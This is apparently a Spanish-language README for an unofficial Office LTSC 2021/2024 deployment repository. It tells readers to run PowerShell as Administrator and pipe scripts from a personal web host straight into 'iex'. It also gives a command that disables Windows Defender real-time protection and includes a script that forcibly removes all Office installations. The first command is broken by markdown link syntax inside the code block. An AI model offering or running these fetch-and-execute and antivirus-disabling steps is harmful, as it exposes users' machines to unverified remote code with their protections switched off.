# 🛠️ Laboratorio de Despliegue Automatizado

Repositorio central para la instalación y configuración automatica del paquete de office en entornos limpios donde no hay versiones anteriores

### 🚀 Comandos de Ejecución Rápida
*(Ejecutar siempre en PowerShell como Administrador)*

**👉 Desplegar Office LTSC 2021 (Estable/Ligero):**
```powershell
irm [https://juanpabloante.github.io/office.ps1](https://juanpabloante.github.io/office.ps1) | iex

**👉 Desplegar Office LTSC 2024 utlima version (Estable/Ligero):**

irm https://juanpabloante.github.io/office2024.ps1 | iex

irm https://raw.githubusercontent.com/juanpabloante/juanpabloante.github.io/main/office2024.ps1 | iex

Detener proteccion en tiempo real

Set-MpPreference -DisableRealtimeMonitoring $true


eliminar totalmente la instalacion de offie 

# --- Script de Purga ProTech Solutions ---
$TempDir = "C:\ProTechDeploy"
Set-Location $TempDir

Write-Host "-> Iniciando desinstalacion forzada de Office..." -ForegroundColor Cyan

# Creamos un archivo XML temporal para la desinstalacion
$UninstallXml = @"
<Configuration>
  <Remove All="TRUE">
  </Remove>
  <Display Level="Full" AcceptEULA="TRUE" />
</Configuration>
"@
$UninstallXml | Out-File "$TempDir\uninstall.xml" -Encoding ascii

# Ejecutamos el comando de remocion
Write-Host "-> Ejecutando proceso de limpieza. Por favor espera..." -ForegroundColor Yellow
Start-Process -FilePath ".\setup.exe" -ArgumentList "/configure uninstall.xml" -Wait

Write-Host "-> Office ha sido removido. Reiniciando servicios de seguridad..." -ForegroundColor Green
Set-MpPreference -DisableRealtimeMonitoring $false

Write-Host "¡Limpieza completada! Ya puedes ejecutar la prueba final." -ForegroundColor White
